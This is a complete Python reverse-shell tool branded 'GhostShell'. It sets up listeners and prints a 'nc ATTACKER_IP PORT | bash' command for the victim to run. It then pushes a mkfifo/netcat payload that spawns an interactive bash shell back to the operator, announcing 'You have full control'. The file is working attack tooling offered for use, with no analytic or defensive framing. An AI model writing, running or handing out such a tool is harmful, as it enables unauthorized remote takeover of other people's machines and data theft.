#!/usr/bin/env python3

import socket
import sys
import select
import termios
import tty
import os
import threading
import time
import shutil
import signal
import subprocess

def get_interfaces():
    interfaces = []
    try:
        result = subprocess.run(['ip', '-o', '-4', 'addr', 'show'],
                                capture_output=True, text=True)
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                ip = parts[3].split('/')[0]
                interfaces.append((iface, ip))
    except:
        pass
    return interfaces

def read_key(fd):
    ch = os.read(fd, 1)
    if ch == b'\x1b':
        try:
            ch += os.read(fd, 2)
        except:
            pass
    return ch

def pick_interface():
    interfaces = get_interfaces()
    if not interfaces:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        finally:
            s.close()

    selected = 0
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)

    def draw(first=False):
        if first:
            sys.stdout.write("\033[s")  # save cursor position
        else:
            sys.stdout.write("\033[u")  # restore cursor position
            sys.stdout.write("\033[0J") # clear everything below
        for i, (iface, ip) in enumerate(interfaces):
            if i == selected:
                sys.stdout.write(f"  \033[1;36m▶  {iface:<12} {ip}\033[0m\n")
            else:
                sys.stdout.write(f"     \033[2m{iface:<12} {ip}\033[0m\n")
        sys.stdout.flush()

    print(f"  \033[1;36m[?]\033[0m Select interface \033[2m(↑↓ arrow + Enter)\033[0m\n")
    draw(first=True)

    try:
        tty.setraw(fd)
        while True:
            ch = read_key(fd)

            if ch == b'\x1b[A':
                selected = (selected - 1) % len(interfaces)
                draw()
            elif ch == b'\x1b[B':
                selected = (selected + 1) % len(interfaces)
                draw()
            elif ch[0:1] in (b'\r', b'\n'):
                break
            elif ch[0:1] == b'\x03':
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
                print()
                sys.exit(0)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

    print()
    return interfaces[selected][1]

def get_terminal_size():
    size = shutil.get_terminal_size(fallback=(80, 24))
    return size.lines, size.columns

def make_server(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    return srv

def banner():
    print("\033[1;36m")
    print("  ░██████╗░██╗  ██╗░█████╗░░██████╗████████╗░██████╗██╗  ██╗███████╗██╗░░░░░██╗░░░░░")
    print("  ██╔════╝░██║  ██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║░░░░░██║░░░░░")
    print("  ██║░░██╗░███████║██║░░██║╚█████╗░   ██║   ╚█████╗░███████║█████╗  ██║░░░░░██║░░░░░")
    print("  ██║░░╚██╗██╔══██║██║░░██║░╚═══██╗   ██║   ░╚═══██╗██╔══██║██╔══╝  ██║░░░░░██║░░░░░")
    print("  ╚██████╔╝██║  ██║╚█████╔╝██████╔╝   ██║   ██████╔╝██║  ██║███████╗███████╗███████╗")
    print("  ░╚═════╝░╚═╝  ╚═╝░╚════╝░╚═════╝░   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
    print("\033[0m")

# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

banner()

ATTACKER_IP = pick_interface()
print(f"  \033[1;36m[*]\033[0m Using IP    : \033[1;33m{ATTACKER_IP}\033[0m")

try:
    PORT = int(input("  \033[1;36m[?]\033[0m Listen port : ").strip())
except ValueError:
    PORT = 4444

SHELL_PORT = PORT + 1

print(f"  \033[1;36m[*]\033[0m Cmd  port   : {PORT}")
print(f"  \033[1;36m[*]\033[0m Shell port  : {SHELL_PORT}")
print()

# ─────────────────────────────────────────
#  WAIT FOR SHELL ON PORT+1 (background)
# ─────────────────────────────────────────

shell_sock = None
shell_ready = threading.Event()

def await_shell():
    global shell_sock
    srv = make_server(SHELL_PORT)
    srv.settimeout(60)
    print(f"  \033[1;36m[*]\033[0m Waiting for shell on port {SHELL_PORT}...")
    try:
        shell_sock, addr = srv.accept()
        print(f"  \033[1;32m[+]\033[0m Shell connected from {addr[0]}:{addr[1]}")
        shell_ready.set()
    except socket.timeout:
        print(f"  \033[1;31m[!]\033[0m Shell timed out on port {SHELL_PORT}")
    finally:
        srv.close()

t = threading.Thread(target=await_shell, daemon=True)
t.start()
time.sleep(0.3)

# ─────────────────────────────────────────
#  WAIT FOR VICTIM NC CONNECTION
# ─────────────────────────────────────────

print(f"  \033[1;36m[*]\033[0m Waiting for victim on port {PORT}...")
print(f"  \033[1;36m[*]\033[0m Run this on victim:")
print()
print(f"      \033[1;31mnc {ATTACKER_IP} {PORT} | bash\033[0m")
print()

cmd_srv = make_server(PORT)
cmd_sock, addr = cmd_srv.accept()
cmd_srv.close()
print(f"  \033[1;32m[+]\033[0m Victim connected from {addr[0]}:{addr[1]}")

# ─────────────────────────────────────────
#  SEND PAYLOAD
# ─────────────────────────────────────────

rows, cols = get_terminal_size()

payload = (
    f"rm -f /tmp/.rs; mkfifo /tmp/.rs; "
    f"cat /tmp/.rs | python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>&1 | nc {ATTACKER_IP} {SHELL_PORT} > /tmp/.rs\n"
)

print(f"  \033[1;36m[*]\033[0m Sending payload...")
try:
    cmd_sock.sendall(payload.encode())
    time.sleep(0.5)
    cmd_sock.close()
except Exception as e:
    print(f"  \033[1;31m[!]\033[0m Failed to send payload: {e}")
    sys.exit(1)

# ─────────────────────────────────────────
#  WAIT FOR SHELL CALLBACK
# ─────────────────────────────────────────

print(f"  \033[1;36m[*]\033[0m Payload sent. Waiting for shell callback (60s)...")
shell_ready.wait(timeout=60)

if not shell_sock:
    print("\n  \033[1;31m[!]\033[0m Shell did not connect back.")
    print("      - Victim needs python3 + nc installed")
    print(f"      - Check port {SHELL_PORT} is not firewalled")
    sys.exit(1)

# ─────────────────────────────────────────
#  SYNC TERMINAL SIZE
# ─────────────────────────────────────────

time.sleep(1.0)

shell_sock.setblocking(False)
deadline = time.time() + 0.5
while time.time() < deadline:
    try:
        shell_sock.recv(4096)
    except:
        break
    time.sleep(0.05)
shell_sock.setblocking(True)

shell_sock.sendall(f"stty rows {rows} cols {cols}\n".encode())
time.sleep(0.3)
shell_sock.sendall(f"export TERM=xterm-256color\n".encode())
time.sleep(0.3)
shell_sock.sendall(b"clear\n")
time.sleep(0.5)

print(f"  \033[1;32m[+]\033[0m Shell ready! Rows={rows} Cols={cols}")
print(f"  \033[1;36m[*]\033[0m You have full control.")
print(f"  \033[1;36m[*]\033[0m Type \033[1;33mexit\033[0m or press \033[1;33mCtrl+C\033[0m to end session.\n")
print("─" * 60)

# ─────────────────────────────────────────
#  AUTO RESIZE ON WINDOW CHANGE
# ─────────────────────────────────────────

def on_resize(signum, frame):
    r, c = get_terminal_size()
    try:
        shell_sock.sendall(f"stty rows {r} cols {c}\n".encode())
    except:
        pass

signal.signal(signal.SIGWINCH, on_resize)

# ─────────────────────────────────────────
#  INTERACTIVE LOOP
# ─────────────────────────────────────────

fd = sys.stdin.fileno()
old_settings = termios.tcgetattr(fd)

input_buf = b""

try:
    tty.setraw(fd)

    while True:
        rlist, _, _ = select.select([sys.stdin, shell_sock], [], [], 0.1)

        for ready in rlist:
            if ready == shell_sock:
                data = shell_sock.recv(4096)
                if not data:
                    raise Exception("Victim disconnected")
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()

            elif ready == sys.stdin:
                char = os.read(fd, 1)
                if not char:
                    raise Exception("stdin closed")

                input_buf += char
                if len(input_buf) > 6:
                    input_buf = input_buf[-6:]

                if b"exit\r" in input_buf or b"exit\n" in input_buf:
                    raise Exception("Attacker typed exit")

                shell_sock.sendall(char)

except KeyboardInterrupt:
    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    print("\n\033[1;33m[!]\033[0m Ctrl+C caught — closing session.")
    try:
        shell_sock.close()
    except:
        pass
    print("\033[1;36m[*]\033[0m Terminal restored. GhostShell session ended.")
    sys.exit(0)

except Exception as e:
    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    msg = str(e)
    if "Attacker typed exit" in msg:
        print("\n\033[1;33m[!]\033[0m Exit command detected — closing session.")
    else:
        print(f"\n\033[1;31m[!]\033[0m Disconnected: {msg}")
    try:
        shell_sock.close()
    except:
        pass
    print("\033[1;36m[*]\033[0m Terminal restored. GhostShell session ended.")
    sys.exit(0)
